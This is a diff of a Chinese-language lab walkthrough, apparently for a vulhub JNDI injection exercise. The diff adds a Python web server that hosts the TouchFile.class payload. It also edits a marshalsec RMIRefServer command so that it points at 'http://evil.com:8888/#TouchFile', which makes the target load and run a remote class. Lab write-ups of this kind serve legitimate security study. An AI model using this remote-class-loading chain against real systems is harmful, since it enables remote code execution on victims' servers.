@@ -77,6 +77,12 @@ public class TouchFile {
 }
 ```
 
+通过python搭建一个临时的web服务，该服务是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件。此处payload文件即`TouchFile.class`。
+
+```
+python -m http.server 8888
+```
+
 然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`。
 
 ```
@@ -86,7 +92,7 @@ $ cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar /home/kali/vulnerability/vulhub/
 ```
 
 ```shell
-$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
+$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com:8888/#TouchFile" 9999
 ```
 
 ![image-20220223122416137](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202231224191.png)
